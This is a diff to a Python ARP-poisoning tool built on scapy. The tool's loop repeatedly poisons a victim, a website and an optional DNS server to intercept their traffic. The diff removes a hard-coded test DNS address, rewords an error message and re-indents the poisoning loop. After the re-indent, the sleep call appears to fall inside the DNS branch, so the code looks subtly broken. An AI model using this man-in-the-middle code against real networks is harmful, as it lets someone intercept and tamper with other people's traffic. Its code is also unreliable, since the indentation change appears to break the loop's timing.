@@ -12,16 +12,13 @@ class ARPPoison:
         self.dnsIP = None
         self.dnsMAC = None
 
-        # TODO This is for testing purposes only
-        self.set_dns("172.18.0.40")
-
     def get_mac(self, IP):
         try:
             broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=IP)
             pkt = scapy.srp(broadcast, iface=self.iface, timeout=2)[0]
             mac = pkt[0][1].hwsrc
         except IndexError:
-            print("[ARPPoison]: Could not find victim IP or interface. Exiting...")
+            print("[ARPPoison]: Could not find IP or interface. Exiting...")
             exit(1)
         return mac
 
@@ -61,14 +58,14 @@ class ARPPoison:
             self.ip_forward(True)
 
         while not stop_event.is_set():
-                # Victim <--- Attacker ---> Website
-                self.poison(self.victimIP, self.websiteIP, self.victimMAC)
-                self.poison(self.websiteIP, self.victimIP, self.websiteMAC)
+            # Victim <--- Attacker ---> Website
+            self.poison(self.victimIP, self.websiteIP, self.victimMAC)
+            self.poison(self.websiteIP, self.victimIP, self.websiteMAC)
 
-                # Victim <--- Attacker ---> DNS Server (if discovered)
-                if self.dnsIP and self.dnsMAC:
-                    self.poison(self.victimIP, self.dnsIP, self.victimMAC)
-                    self.poison(self.dnsIP, self.victimIP, self.dnsMAC)
+            # Victim <--- Attacker ---> DNS Server (if discovered)
+            if self.dnsIP and self.dnsMAC:
+                self.poison(self.victimIP, self.dnsIP, self.victimMAC)
+                self.poison(self.dnsIP, self.victimIP, self.dnsMAC)
 
                 time.sleep(10.01 - timer)
 
